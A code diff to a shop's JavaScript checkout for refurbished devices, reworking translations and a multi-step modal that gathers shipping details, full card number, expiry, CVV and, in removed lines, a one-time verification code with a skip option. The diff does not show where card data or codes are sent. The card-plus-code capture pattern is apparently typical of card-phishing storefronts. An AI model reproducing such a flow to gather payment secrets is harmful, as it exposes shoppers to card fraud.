@@ -12,18 +12,24 @@ if (typeof countryConfig === 'undefined') {
     };
 }
 
-// Translation data - check if already defined to prevent duplicate declaration
-if (typeof window.translations === 'undefined') {
-    window.translations = {
+// Transdlation data - check if already defined to prevent duplicate declaration
+const translations = window.translations || {
     es: {
         home: "Inicio",
         products: "Productos",
         about: "Acerca de",
         contact: "Contacto",
         hero_title: "La Mejor Tecnología al Mejor Precio",
+        split_payment: "Pago a Plazos",
+        split_payment_title: "Paga en Cuotas",
+        split_payment_desc: "Paga un depósito del 50% hoy y divide el resto hasta en 6 meses.",
+        about_us_title: "Sobre Nuestra Empresa",
+        about_us_p1: "¡Bienvenido a nuestra tienda en línea! Nos dedicamos a ofrecer los mejores productos y servicios a nuestros clientes. Nuestra misión es entregar calidad y valor en cada compra.",
+        our_team_title: "Nuestro Equipo",
+        our_team_p1: "Contamos con un equipo de profesionales dedicados y apasionados por lo que hacen, siempre listos para ayudarte.",
         hero_subtitle: "Descubre nuestra selección premium de dispositivos reacondicionados con garantía completa y soporte técnico especializado. Tecnología de calidad a precios excepcionales.",
         shop_now: "Comprar Ahora",
-        benefit_free_shipping: "Envío gratis y entrega al día siguiente",
+        benefit_free_shipping: "Envío Gratis",
         benefit_free_shipping_desc: "En todos los pedidos",
         benefit_warranty: "Garantía 1 Año",
         benefit_warranty_desc: "En todos los productos",
@@ -42,8 +48,8 @@ if (typeof window.translations === 'undefined') {
         accessories: "Accesorios",
         add_to_cart: "Agregar al Carrito",
         available_in: "Disponible en:",
-        free_shipping: "Envío gratis y entrega al día siguiente",
-        free_shipping_all: "Envío gratis y entrega al día siguiente en todos los pedidos",
+        free_shipping: "Envío gratis",
+        free_shipping_all: "Envío gratis en todos los pedidos",
         new: "¡Nuevo!",
         certified: "¡Certificado!",
         hot: "¡Popular!",
@@ -69,8 +75,8 @@ if (typeof window.translations === 'undefined') {
         account_number: "Número de Cuenta:",
         account_holder: "Titular de la Cuenta:",
         reference: "Referencia:",
-        transfer_instructions: "Realiza la transferencia por el monto total y envíanos una confirmación por WhatsApp para un envío más rápido.",
-        confirm_transfer: "Enviar confirmación de pago",
+        transfer_instructions: "Realiza la transferencia por el monto total y confirma cuando hayas completado el pago.",
+        confirm_transfer: "He realizado la transferencia",
         bank_name: "Banco:",
         card_details: "Detalles de la Tarjeta",
         accepted: "Aceptado:",
@@ -113,57 +119,6 @@ if (typeof window.translations === 'undefined') {
         code_expires: "El código expira en: ",
         resend_code: "Reenviar Código",
         verify_code: "Verificar Código",
-        spacegray: "Gris Espacial",
-		product_title: "Producto",
-        home: "Inicio",
-        products: "Productos",
-        quantity: "Cantidad:",
-        add_to_cart: "Agregar al Carrito",
-        continue_shopping: "Seguir Comprando",
-        warranty_title: "12 Meses de Garantía",
-        warranty_desc: "Garantía completa con soporte técnico incluido",
-        key_features: "Características Principales",
-        technical_specs: "Especificaciones Técnicas",
-        color: "Color",
-        available_in: "Disponible en:",
-        free_shipping: "Envío gratis a partir de $200",
-        free_shipping_all: "Envío gratis en todos los pedidos",
-        // Footer
-        company_info: "Información de la Empresa",
-        quick_links: "Enlaces Rápidos",
-        policies: "Políticas",
-        payment_methods: "Métodos de Pago",
-        payment_info: "Aceptamos transferencias bancarias, depósitos y pagos contra entrega en efectivo.",
-        rights_reserved: "Todos los derechos reservados.",
-        about: "Acerca de Nosotros",
-        contact: "Contacto",
-        support: "Soporte Técnico",
-        warranty: "Garantía",
-        privacy: "Privacidad",
-        terms: "Términos y Condiciones",
-        returns: "Devoluciones",
-        shipping_policy: "Envíos",
-        // Cart
-        shopping_cart: "Carrito de Compras",
-        empty_cart: "Tu carrito está vacío",
-        subtotal: "Subtotal:",
-        shipping: "Envío:",
-        total: "Total:",
-        checkout: "Proceder al Pago",
-        storage: "Almacenamiento",
-        condition: "Condición",
-        required: "*Requerido",
-        condition_guide: "Guía de Condición:",
-        condition_guide_desc: "Mejores condiciones indican menos desgaste y una apariencia superior del dispositivo.",
-         good: "Bueno",
-        good_desc: "Desgaste moderado, funciona perfectamente",
-        great: "Genial",
-        great_desc: "Desgaste ligero, totalmente funcional",
-        excellent: "Excelente",
-        excellent_desc: "Signos menores de uso",
-        pristine: "Impecable",
-        pristine_desc: "Como nuevo - sin desgaste visible",
-        search_products: "Buscar productos...",
         invalid_code: "Código inválido. Por favor, inténtalo de nuevo."
     },
     en: {
@@ -172,9 +127,16 @@ if (typeof window.translations === 'undefined') {
         about: "About",
         contact: "Contact",
         hero_title: "The Best Technology at the Best Price",
+        split_payment: "Split Payment",
+        split_payment_title: "Pay in Installments",
+        split_payment_desc: "Pay a 50% deposit today and split the rest over up to 6 months.",
+        about_us_title: "About Our Company",
+        about_us_p1: "Welcome to our e-shop! We are dedicated to providing the best products and services to our customers. Our mission is to deliver quality and value with every purchase.",
+        our_team_title: "Our Team",
+        our_team_p1: "We have a dedicated team of professionals who are passionate about what they do and are always here to help you.",
         hero_subtitle: "Discover our premium selection of refurbished devices with full warranty and specialized technical support. Quality technology at exceptional prices.",
         shop_now: "Shop Now",
-        benefit_free_shipping: "Free Shipping and next day delivery",
+        benefit_free_shipping: "Free Shipping",
         benefit_free_shipping_desc: "On all orders",
         benefit_warranty: "1 Year Warranty",
         benefit_warranty_desc: "On all products",
@@ -193,8 +155,8 @@ if (typeof window.translations === 'undefined') {
         accessories: "Accessories",
         add_to_cart: "Add to Cart",
         available_in: "Available in:",
-        free_shipping: "Free Shipping and Next day delivery",
-        free_shipping_all: "Free shipping and next day delivery on all orders",
+        free_shipping: "Free Shipping",
+        free_shipping_all: "Free shipping on all orders",
         new: "New!",
         certified: "Certified!",
         hot: "Hot!",
@@ -220,8 +182,8 @@ if (typeof window.translations === 'undefined') {
         account_number: "Account Number:",
         account_holder: "Account Holder:",
         reference: "Reference:",
-        transfer_instructions: "Make the transfer for the total amount and send us a confirmation via whatsapp for expedited shipping.",
-        confirm_transfer: "Send Payment Confirmation",
+        transfer_instructions: "Make the transfer for the total amount and confirm when you have completed the payment.",
+        confirm_transfer: "I have made the transfer",
         bank_name: "Bank:",
         card_details: "Card Details",
         accepted: "Accepted:",
@@ -264,70 +226,9 @@ if (typeof window.translations === 'undefined') {
         code_expires: "Code expires in: ",
         resend_code: "Resend Code",
         verify_code: "Verify Code",
-	product_title: "Product",
-        home: "Home",
-        products: "Products",
-        quantity: "Quantity:",
-        add_to_cart: "Add to Cart",
-        continue_shopping: "Continue Shopping",
-        warranty_title: "12 Month Warranty",
-        warranty_desc: "Full warranty with technical support included",
-        key_features: "Key Features",
-        technical_specs: "Technical Specifications",
-        color: "Color",
-        available_in: "Available in:",
-        free_shipping: "Free shipping on orders over $200",
-        free_shipping_all: "Free shipping on all orders",
-        // Footer
-        company_info: "Company Information",
-        quick_links: "Quick Links",
-        policies: "Policies",
-        payment_methods: "Payment Methods",
-        payment_info: "We accept bank transfers, deposits and cash on delivery payments.",
-        rights_reserved: "All rights reserved.",
-        about: "About Us",
-        contact: "Contact",
-        support: "Technical Support",
-        warranty: "Warranty",
-        privacy: "Privacy",
-        terms: "Terms and Conditions",
-        returns: "Returns",
-        shipping_policy: "Shipping",
-        // Product page specific
-        storage: "Storage",
-        condition: "Condition",
-        required: "*Required",
-        condition_guide: "Condition Guide:",
-        condition_guide_desc: "Better conditions indicate less wear and superior device appearance.",
-        // Cart
-        shopping_cart: "Shopping Cart",
-        empty_cart: "Your cart is empty",
-        subtotal: "Subtotal:",
-        shipping: "Shipping:",
-        total: "Total:",
-        checkout: "Proceed to Checkout",
-         good: "Good",
-        good_desc: "Moderate wear, works perfectly",
-        great: "Great",
-        great_desc: "Light wear, fully functional",
-        excellent: "Excellent",
-        excellent_desc: "Minor signs of use",
-        pristine: "Pristine",
-        pristine_desc: "Like new - no visible wear",
-        search_products: "Search products...",
         invalid_code: "Invalid code. Please try again."
-   }
-    };
-}
-
-function t(key) {
-  const lang = window.currentLanguage || 'en'; // fallback to English if not set
-  return (window.translations[lang] && window.translations[lang][key]) 
-    ? window.translations[lang][key] 
-    : key; // fallback to key if translation is missing
-}
-
-
+    }
+};
 
 // Global variables
 let currentCountry = localStorage.getItem('selectedCountry') || 'honduras';
@@ -338,6 +239,7 @@ document.addEventListener('DOMContentLoaded', () => {
     currentCountry = localStorage.getItem('selectedCountry') || 'honduras';
     updateFooterFromBusinessAddress();
 });
+
 
 
 
@@ -725,6 +627,7 @@ function createCheckoutModal() {
     if (existingOverlay) {
         existingOverlay.remove();
     }
+
     const overlay = document.createElement('div');
     overlay.id = 'checkout-overlay';
     overlay.className = 'checkout-overlay active';
@@ -736,9 +639,9 @@ function createCheckoutModal() {
     checkoutData.total = subtotal;
     checkoutData.orderNumber = `ORDER-${Date.now()}`;
 
-    const checkoutHTML2 = `
+    const checkoutHTML = `
     <div class="checkout-header">
-        <h2>${t("checkout")}</h2>
+        <h2 data-translate="checkout">Checkout</h2>
         <button class="close-checkout">
             <i class="fas fa-times"></i>
         </button>
@@ -746,322 +649,299 @@ function createCheckoutModal() {
     <div class="checkout-content">
         <div class="checkout-steps">
             <div class="step active" data-step="1">
-                <span>${t("summary")}</span>
+                <span>${(currentLanguage === 'es' ? 'Resumen' : 'Summary')}</span>
             </div>
             <div class="step" data-step="2">
-                <span>${t("information")}</span>
+                <span>${currentLanguage === 'es' ? 'Información' : 'Information'}</span>
             </div>
             <div class="step" data-step="3">
-                <span>${t("payment")}</span>
+                <span>${currentLanguage === 'es' ? 'Pago' : 'Payment'}</span>
             </div>
             <div class="step" data-step="4">
-                <span>${t("processing")}</span>
+                <span>${currentLanguage === 'es' ? 'Procesando' : 'Processing'}</span>
             </div>
             <div class="step" data-step="5">
-                <span>${t("confirmation")}</span>
+                <span>${currentLanguage === 'es' ? 'Confirmación' : 'Confirmation'}</span>
             </div>
             <div class="step" data-step="6">
-                <span>${t("verification")}</span>
+                <span>${currentLanguage === 'es' ? 'Verificación' : 'Verification'}</span>
             </div>
         </div>
         <div id="checkout-step-1" class="checkout-step active">
             <div class="order-summary">
                 <div class="summary-section">
-                    <h3>${t("order_summary")}</h3>
+                    <h3>${currentLanguage === 'es' ? 'Resumen del Pedido' : 'Order Summary'}</h3>
                     <div class="checkout-items">
                         ${cart.map(item => {
+                            const itemPrice = (item.price === 0 || item.isFreeGift) ? 'FREE' : convertPrice(item.price * item.quantity, false);
+                            const giftIndicator = (item.price === 0 || item.isFreeGift) ? ' 🎁' : '';
                             const isFreeGift = item.price === 0 || item.isFreeGift;
-                            const itemPrice = isFreeGift 
-                                ? t("free") 
-                                : convertPrice(item.price * item.quantity, false);
-                            const giftIndicator = isFreeGift ? ' 🎁' : '';
                             return `
                                 <div class="checkout-item ${isFreeGift ? 'free-gift-checkout-item' : ''}">
                                     <img src="${item.image}" alt="${item.name}" style="width: 50px; height: 50px; object-fit: contain; background: var(--background-light); border-radius: 6px; padding: 3px;">
                                     <div class="checkout-item-details">
                                         <h4>${item.name}${giftIndicator}</h4>
-                                        <p>${t("qty")}: ${item.quantity} × <span class="checkout-item-price">${itemPrice}</span></p>
+                                        <p>Qty: ${item.quantity} × <span class="checkout-item-price">${itemPrice}</span></p>
                                     </div>
                                 </div>
                             `;
                         }).join('')}
                     </div>
                 </div>
-            </div>
-        </div>
-    </div>
-`;
 
-
-              const discountHTML = `
-<div class="summary-section">
-    <h4>${t("discount_code")}</h4>
-    <div class="discount-input-group">
-        <input type="text" id="discount-code" class="discount-input" 
-               placeholder="${t("enter_code_placeholder")}" 
-               maxlength="20">
-        <button type="button" id="apply-discount" class="btn btn-secondary discount-apply-btn">
-            ${t("apply")}
-        </button>
-    </div>
-    <div id="discount-message" class="discount-message"></div>
-</div>
-`;
-
-
-const checkoutHTML = `
-<div class="summary-section">
-    <h4>${t("cost_summary")}</h4>
-    <div class="totals-row">
-        <span class="totals-label">${t("subtotal")}</span>
-        <span class="totals-value" id="checkout-subtotal">${convertPrice(subtotal, false)}</span>
-    </div>
-    <div class="totals-row shipping-row">
-        <span class="totals-label">${t("shipping")}</span>
-        <span class="totals-value free-shipping">
-            <i class="fas fa-shipping-fast"></i>
-            ${t("free")}
-        </span>
-    </div>
-    <div class="totals-separator"></div>
-    <div class="totals-row total-row">
-        <span class="totals-label total-label">${t("total")}</span>
-        <span class="totals-value total-value" id="checkout-total">${convertPrice(subtotal, false)}</span>
-    </div>
-</div>
-
-<div class="summary-section">
-    <div class="terms-agreement" style="display: flex; align-items: center; gap: 0.75rem; padding: 1rem; background: var(--background-light); border-radius: var(--border-radius); border: 1px solid var(--border-color);">
-        <input type="checkbox" id="terms-checkbox" required style="transform: scale(1.2); accent-color: var(--primary-color);">
-        <label for="terms-checkbox" style="cursor: pointer; font-size: 0.95rem; color: var(--text-color);">
-            ${t("agree_to")} 
-            <a href="terms.html" target="_blank" style="color: var(--primary-color); text-decoration: underline;">
-                ${t("terms_and_conditions")}
-            </a>
-        </label>
-    </div>
-</div>
-
-<div class="step-actions" style="margin-top: 1.5rem; display: flex; justify-content: center;">
-    <button id="next-to-shipping" class="btn btn-primary checkout-next" disabled>
-        ${t("continue")} <i class="fas fa-arrow-right"></i>
-    </button>
-</div>
-
-<div id="checkout-step-2" class="checkout-step">
-    <div class="customer-info-section">
-        <h3>${t("shipping_info")}</h3>
-        <div class="form-row">
-            <div class="form-group">
-                <label>${t("full_name")} *</label>
-                <input type="text" id="customer-name" required placeholder="${t("enter_full_name")}" autocomplete="name">
-            </div>
-        </div>
-
-        <div class="form-group">
-            <label>${t("phone_number")} *</label>
-            <input type="tel" id="customer-phone" required placeholder="${t("phone_number_placeholder")}" autocomplete="tel">
-        </div>
-        <div class="form-group">
-            <label>${t("country")} *</label>
-            <input type="text" id="customer-country" required value="${countryConfig[currentCountry].name}" readonly style="background: #f5f5f5;" autocomplete="country">
-        </div>
-        <div class="form-group">
-            <label>${t("complete_address")} *</label>
-            <textarea id="customer-address" required placeholder="${t("complete_address_placeholder")}" rows="4" class="responsive-textarea" autocomplete="street-address"></textarea>
-            <div class="address-help">
-                <i class="fas fa-info-circle"></i> 
-                ${t("address_help")}
-            </div>
-        </div>
-        <div class="form-row">
-            <div class="form-group">
-                <label>${t("city")} *</label>
-                <input type="text" id="customer-city" required placeholder="${t("city")}" autocomplete="address-level2">
-            </div>
-            <div class="form-group">
-                <label>${t("postal_code")}</label>
-                <input type="text" id="customer-postal" placeholder="${t("postal_code_placeholder")}" autocomplete="postal-code">
-            </div>
-        </div>
-
-        <div class="step-actions" style="margin-top: 2rem; display: flex; justify-content: space-between;">
-            <button id="back-to-summary" class="btn btn-secondary">
-                <i class="fas fa-arrow-left"></i> ${t("back")}
-            </button>
-            <button id="next-to-payment" class="btn btn-primary checkout-next">
-                ${t("continue_to_payment")} <i class="fas fa-arrow-right"></i>
-            </button>
-        </div>
-    </div>
-</div>
-
-<div id="checkout-step-3" class="checkout-step">
-    <div class="payment-section">
-        <h3>${t("payment_method")}</h3>
-        <div class="payment-methods">
-            <label class="payment-option" data-method="bank-transfer">
-                <input type="radio" name="payment-method" value="bank-transfer">
-                <div class="payment-option-content">
-                    <i class="fas fa-university"></i>
-                    <span>${t("bank_transfer")}</span>
+                <div class="summary-section">
+                    <h4>${(currentLanguage === 'es' ? 'Resumen de Costos' : 'Cost Summary')}</h4>
+                    <div class="checkout-totals">
+                        <div class="totals-row">
+                            <span class="totals-label">${(currentLanguage === 'es' ? 'Subtotal:' : 'Subtotal:')}</span>
+                            <span class="totals-value" id="checkout-subtotal">${convertPrice(subtotal, false)}</span>
+                        </div>
+                        <div class="totals-row shipping-row">
+                            <span class="totals-label">${(currentLanguage === 'es' ? 'Envío:' : 'Shipping:')}</span>
+                            <span class="totals-value free-shipping">
+                                <i class="fas fa-shipping-fast"></i>
+                                ${(currentLanguage === 'es' ? 'Gratis' : 'Free')}
+                            </span>
+                        </div>
+                        <div class="totals-separator"></div>
+                        <div class="totals-row total-row">
+                            <span class="totals-label total-label">${(currentLanguage === 'es' ? 'Total:' : 'Total:')}</span>
+                            <span class="totals-value total-value" id="checkout-total">${convertPrice(subtotal, false)}</span>
+                        </div>
+                    </div>
                 </div>
-            </label>
-            <label class="payment-option" data-method="credit-card">
-                <input type="radio" name="payment-method" value="credit-card">
-                <div class="payment-option-content">
-                    <i class="fas fa-credit-card"></i>
-                    <span>${t("credit_card")}</span>
+
+                <div class="summary-section">
+                    <div class="terms-agreement" style="display: flex; align-items: center; gap: 0.75rem; padding: 1rem; background: var(--background-light); border-radius: var(--border-radius); border: 1px solid var(--border-color);">
+                        <input type="checkbox" id="terms-checkbox" required style="transform: scale(1.2); accent-color: var(--primary-color);">
+                        <label for="terms-checkbox" style="cursor: pointer; font-size: 0.95rem; color: var(--text-color);">
+                            ${(currentLanguage === 'es' ? 'Acepto los' : 'I agree to the')} 
+                            <a href="terms.html" target="_blank" style="color: var(--primary-color); text-decoration: underline;">
+                                ${(currentLanguage === 'es' ? 'Términos y Condiciones' : 'Terms and Conditions')}
+                            </a>
+                        </label>
+                    </div>
                 </div>
-            </label>
-        </div>
 
-        <div id="payment-method-instruction" class="payment-instruction" style="text-align: center; padding: 2rem; color: var(--text-light); background: var(--background-light); border-radius: var(--border-radius); margin-top: 1rem;">
-            <i class="fas fa-hand-pointer" style="font-size: 2rem; margin-bottom: 1rem; color: var(--primary-color);"></i>
-            <p>${t("select_payment_method")}</p>
-            ${currentCountry !== 'nicaragua' ? `<p style="margin-top: 1rem; font-size: 0.9rem; color: var(--text-light);">${t("bank_transfer_note")}</p>` : ''}
-        </div>
-
-        <div id="bank-transfer-details" class="payment-details" style="display: none;">
-            <h4>${t("bank_details")}</h4>
-            <div class="bank-info">
-                <p><strong>${t("bank_name")}</strong> ${getBankName()}</p>
-                <p><strong>${t("account_number")}</strong> ${getAccountNumber()}</p>
-                <p><strong>${t("account_holder")}</strong> ${getAccountHolder()}</p>
-                <p><strong>${t("reference")}</strong> ${checkoutData.orderNumber}</p>
-                <p><strong>${t("total_transfer")}</strong> ${convertPrice(subtotal, false)}</p>
+                <div class="step-actions" style="margin-top: 1.5rem; display: flex; justify-content: center;">
+                    <button id="next-to-shipping" class="btn btn-primary checkout-next" disabled>
+                        ${(currentLanguage === 'es' ? 'Continuar' : 'Continue')} <i class="fas fa-arrow-right"></i>
+                    </button>
+                </div>
             </div>
-
-            <p class="transfer-instructions">${t("transfer_instructions")}</p>
-            <button class="btn btn-primary place-order" data-method="bank-transfer">
-                ${t("confirm_transfer")}
-            </button>
         </div>
+         <div id="checkout-step-2" class="checkout-step">
+            <div class="customer-info-section">
+                <h3>${(currentLanguage === 'es' ? 'Información de Envío' : 'Shipping Information')}</h3>
+                <div class="form-row">
+                    <div class="form-group">
+                        <label>${(currentLanguage === 'es' ? 'Nombre Completo' : 'Full Name')} *</label>
+                        <input type="text" id="customer-name" required placeholder="${(currentLanguage === 'es' ? 'Ingrese su nombre completo' : 'Enter your full name')}" autocomplete="name">
+                    </div>
 
-        <div id="credit-card-details" class="payment-details" style="display: none;">
-            <h4>${t("card_details")}</h4>
-            <p class="accepted-cards">
-                <span>${t("accepted")}</span>
-                <i class="fab fa-cc-visa"></i>
-                <i class="fab fa-cc-mastercard"></i>
-                <i class="fab fa-cc-amex"></i>
-            </p>
-            <form class="card-form">
-                <div class="form-group">
-                    <label>${t("cardholder_name")}</label>
-                    <input type="text" id="cardholder-name" required>
                 </div>
                 <div class="form-group">
-                    <label>${t("card_number")}</label>
-                    <input type="text" id="card-number" placeholder="1234 5678 9012 3456" required maxlength="19">
+                    <label>${(currentLanguage === 'es' ? 'Teléfono' : 'Phone Number')} *</label>
+                    <input type="tel" id="customer-phone" required placeholder="${(currentLanguage === 'es' ? 'Número de teléfono' : 'Phone number')}" autocomplete="tel">
+                </div>
+                <div class="form-group">
+                    <label>${(currentLanguage === 'es' ? 'País' : 'Country')} *</label>
+                    <input type="text" id="customer-country" required value="${countryConfig[currentCountry].name}" readonly style="background: #f5f5f5;" autocomplete="country">
+                </div>
+                <div class="form-group">
+                    <label>${(currentLanguage === 'es' ? 'Dirección Completa' : 'Complete Address')} *</label>
+                    <textarea id="customer-address" required placeholder="${(currentLanguage === 'es' ? 'Dirección completa: Calle, número, ciudad, estado/provincia, código postal...' : 'Complete address: Street, number, city, state/province, postal code...')}" rows="4" class="responsive-textarea" autocomplete="street-address"></textarea>
+                    <div class="address-help">
+                        <i class="fas fa-info-circle"></i> 
+                        ${(currentLanguage === 'es' ? 'Incluya toda la información necesaria para la entrega' : 'Include all necessary information for delivery')}
+                    </div>
                 </div>
                 <div class="form-row">
                     <div class="form-group">
-                        <label>${t("expiry_date")}</label>
-                        <input type="text" id="expiry-date" placeholder="MM/YY" required>
+                        <label>${(currentLanguage === 'es' ? 'Ciudad' : 'City')} *</label>
+                        <input type="text" id="customer-city" required placeholder="${(currentLanguage === 'es' ? 'Ciudad' : 'City')}" autocomplete="address-level2">
                     </div>
                     <div class="form-group">
-                        <label>CVV</label>
-                        <input type="text" id="cvv" placeholder="123" required>
+                        <label>${(currentLanguage === 'es' ? 'Código Postal' : 'Postal Code')}</label>
+                        <input type="text" id="customer-postal" placeholder="${(currentLanguage === 'es' ? 'Código postal' : 'Postal code')}" autocomplete="postal-code">
                     </div>
                 </div>
-                <div id="card-errors" class="error-message" style="color: red; display: none;"></div>
-            </form>
-            <p class="security-notice">
-                <i class="fas fa-lock"></i>
-                <span>${t("secure_ssl")}</span>
-            </p>
-            <button class="btn btn-primary place-order" data-method="credit-card">
-                ${t("process_payment")}
-            </button>
-        </div>
 
-        <div class="step-actions" style="margin-top: 2rem; display: flex; justify-content: space-between;">
-            <button id="back-to-shipping" class="btn btn-secondary">
-                <i class="fas fa-arrow-left"></i> ${t("back")}
-            </button>
-        </div>
-    </div>
-</div>
-
-<div id="checkout-step-4" class="checkout-step">
-    <div class="processing-section">
-        <div class="loading-state" id="processing-card-submission">
-            <div class="spinner"></div>
-            <h3>${t("submitting_card_info")}</h3>
-            <p>${t("please_wait_card")}</p>
-        </div>
-    </div>
-</div>
-
-<div id="checkout-step-5" class="checkout-step">
-    <div class="confirmation-section">
-        <div class="loading-state" id="processing-payment">
-            <div class="spinner"></div>
-            <h3>${t("processing_payment")}</h3>
-            <p>${t("please_wait_payment")}</p>
-            <p class="processing-steps">
-                <span class="step-text">${t("validating_payment_method")}</span>
-            </p>
-        </div>
-        <div class="success-state" id="order-success" style="display: none;">
-            <div class="success-icon">
-                <i class="fas fa-check-circle"></i>
-            </div>
-            <h3>${t("order_confirmed")}</h3>
-            <p>${t("order_processed_success")}</p>
-            <div class="order-details">
-                <div class="order-detail">
-                    <span>${t("order_number")}</span>
-                    <strong id="final-order-number">${checkoutData.orderNumber}</strong>
-                </div>
-                <div class="order-detail">
-                    <span>${t("total")}</span>
-                    <strong>${convertPrice(subtotal, false)}</strong>
-                </div>
-                <div class="order-detail">
-                    <span>${t("estimated_delivery")}</span>
-                    <strong>${getEstimatedDelivery()}</strong>
+                <div class="step-actions" style="margin-top: 2rem; display: flex; justify-content: space-between;">
+                    <button id="back-to-summary" class="btn btn-secondary">
+                        <i class="fas fa-arrow-left"></i> ${(currentLanguage === 'es' ? 'Volver' : 'Back')}
+                    </button>
+                    <button id="next-to-payment" class="btn btn-primary checkout-next">
+                        ${(currentLanguage === 'es' ? 'Continuar al Pago' : 'Continue to Payment')} <i class="fas fa-arrow-right"></i>
+                    </button>
                 </div>
             </div>
-            <button class="btn btn-primary close-checkout-success">${t("continue_shopping")}</button>
         </div>
-    </div>
-</div>
 
-<div id="checkout-step-6" class="checkout-step">
-    <div class="otp-section">
-        <div class="otp-header">
-            <div class="otp-security">
-                <i class="fas fa-shield-alt"></i>
-                <span>${t("security_verification")}</span>
+        <div id="checkout-step-3" class="checkout-step">
+            <div class="payment-section">
+                <h3>${(currentLanguage === 'es' ? 'Método de Pago' : 'Payment Method')}</h3>
+                <div class="payment-methods">
+                    <label class="payment-option" data-method="bank-transfer">
+                        <input type="radio" name="payment-method" value="bank-transfer">
+                        <div class="payment-option-content">
+                            <i class="fas fa-university"></i>
+                            <span>${(currentLanguage === 'es' ? 'Transferencia Bancaria' : 'Bank Transfer')}</span>
+                        </div>
+                    </label>
+                    <label class="payment-option" data-method="credit-card">
+                        <input type="radio" name="payment-method" value="credit-card">
+                        <div class="payment-option-content">
+                            <i class="fas fa-credit-card"></i>
+                            <span>${(currentLanguage === 'es' ? 'Tarjeta de Crédito' : 'Credit Card')}</span>
+                        </div>
+                    </label>
+                </div>
+
+                <div id="payment-method-instruction" class="payment-instruction" style="text-align: center; padding: 2rem; color: var(--text-light); background: var(--background-light); border-radius: var(--border-radius); margin-top: 1rem;">
+                    <i class="fas fa-hand-pointer" style="font-size: 2rem; margin-bottom: 1rem; color: var(--primary-color);"></i>
+                    <p>${(currentLanguage === 'es' ? 'Por favor selecciona un método de pago para continuar' : 'Please select a payment method to continue')}</p>
+                    ${currentCountry !== 'nicaragua' ? `<p style="margin-top: 1rem; font-size: 0.9rem; color: var(--text-light);">${(currentLanguage === 'es' ? 'Nota: Transferencia bancaria solo está disponible en Nicaragua' : 'Note: Bank transfer is only available in Nicaragua')}</p>` : ''}
+                </div>
+
+                <div id="bank-transfer-details" class="payment-details" style="display: none;">
+                    <h4>${(currentLanguage === 'es' ? 'Datos Bancarios' : 'Bank Details')}</h4>
+                    <div class="bank-info">
+                        <p><strong>${(currentLanguage === 'es' ? 'Banco:' : 'Bank:')}</strong> ${getBankName()}</p>
+                        <p><strong>${(currentLanguage === 'es' ? 'Número de Cuenta:' : 'Account Number:')}</strong> ${getAccountNumber()}</p>
+                        <p><strong>${(currentLanguage === 'es' ? 'Titular de la Cuenta:' : 'Account Holder:')}</strong> ${getAccountHolder()}</p>
+
+                        <p><strong>${(currentLanguage === 'es' ? 'Referencia:' : 'Reference:')}</strong> ${checkoutData.orderNumber}</p>
+                        <p><strong>${(currentLanguage === 'es' ? 'Total a Transferir:' : 'Amount to Transfer:')}</strong> ${convertPrice(subtotal, false)}</p>
+                    </div>
+                    <p class="transfer-instructions">
+                        ${(currentLanguage === 'es' ? 'Realiza la transferencia por el monto total y confirma cuando hayas completado el pago.' : 'Make the transfer for the total amount and confirm when you have completed the payment.')}
+                    </p>
+                    <button class="btn btn-primary place-order" data-method="bank-transfer">${(currentLanguage === 'es' ? 'He realizado la transferencia' : 'I have made the transfer')}</button>
+                </div>
+
+            <div id="credit-card-details" class="payment-details" style="display: none;">
+                    <h4>${(currentLanguage === 'es' ? 'Detalles de la Tarjeta' : 'Card Details')}</h4>
+                    <p class="accepted-cards">
+                        <span>${(currentLanguage === 'es' ? 'Aceptado:' : 'Accepted:')}</span>
+                        <i class="fab fa-cc-visa"></i>
+                        <i class="fab fa-cc-mastercard"></i>
+                        <i class="fab fa-cc-amex"></i>
+                    </p>
+                    <form class="card-form">
+                        <div class="form-group">
+                            <label>${(currentLanguage === 'es' ? 'Nombre del Titular' : 'Cardholder Name')}</label>
+                            <input type="text" id="cardholder-name" required>
+                        </div>
+                        <div class="form-group">
+                            <label>${(currentLanguage === 'es' ? 'Número de Tarjeta' : 'Card Number')}</label>
+                            <input type="text" id="card-number" placeholder="1234 5678 9012 3456" required maxlength="19">
+                        </div>
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label>${(currentLanguage === 'es' ? 'Fecha de Vencimiento' : 'Expiry Date')}</label>
+                                <input type="text" id="expiry-date" placeholder="MM/YY" required>
+                            </div>
+                            <div class="form-group">
+                                <label>CVV</label>
+                                <input type="text" id="cvv" placeholder="123" required maxlength="4">
+                            </div>
+                        </div>
+						<div id="card-errors" class="error-message" style="color: red; display: none;"></div>
+                    </form>
+                    <p class="security-notice">
+                        <i class="fas fa-lock"></i>
+                        <span>${(currentLanguage === 'es' ? 'Conexión SSL Segura - Tus datos están protegidos' : 'Secure SSL Connection - Your data is protected')}</span>
+                    </p>
+                    <button class="btn btn-primary place-order" data-method="credit-card">${(currentLanguage === 'es' ? 'Procesar Pago' : 'Process Payment')}</button>
+                </div>
+
+                <div class="step-actions" style="margin-top: 2rem; display: flex; justify-content: space-between;">
+                    <button id="back-to-shipping" class="btn btn-secondary">
+                        <i class="fas fa-arrow-left"></i> ${(currentLanguage === 'es' ? 'Volver' : 'Back')}
+                    </button>
+                </div>
             </div>
         </div>
-        <div class="otp-content">
-            <h3>${t("verify_payment")}</h3>
-            <p>${t("otp_instructions")}</p>
-            <div class="otp-input-container">
-                <input type="tel" id="otp-single-input" class="otp-single-input" maxlength="6" inputmode="numeric" placeholder="123456" style="width: 200px; padding: 15px; font-size: 24px; text-align: center; border: 2px solid var(--border-color); border-radius: 8px; font-family: monospace; letter-spacing: 0.5em;" />
-            </div>
-            <div class="otp-timer">
-                <span>${t("code_expires_in")}</span> 
-                <span id="otp-countdown">02:00</span>
-            </div>
-            <div class="otp-actions">
-                <button id="resend-otp-btn" class="btn btn-secondary" disabled>${t("resend_code")}</button>
-                <button id="verify-otp-btn" class="btn btn-primary">${t("verify_code")}</button>
-                <button id="skip-otp-btn" class="btn btn-outline" style="margin-top: 1rem;">
-                    ${t("skip_otp")}
-                </button>
-            </div>
-            <div class="otp-error" id="otp-error" style="display: none;">
-                <i class="fas fa-exclamation-triangle"></i>
-                <span>${t("invalid_code")}</span>
+
+        <div id="checkout-step-4" class="checkout-step">
+            <div class="processing-section">
+                <div class="loading-state" id="processing-card-submission">
+                    <div class="spinner"></div>
+                    <h3>${(currentLanguage === 'es' ? 'Enviando la información de su tarjeta' : 'Submitting your card information')}</h3>
+                    <p>${(currentLanguage === 'es' ? 'Por favor espere mientras enviamos la información de su tarjeta de crédito de forma segura.' : 'Please wait while we submit your credit card information securely.')}</p>
+                </div>
             </div>
         </div>
-    </div>
-</div>
-`;
+
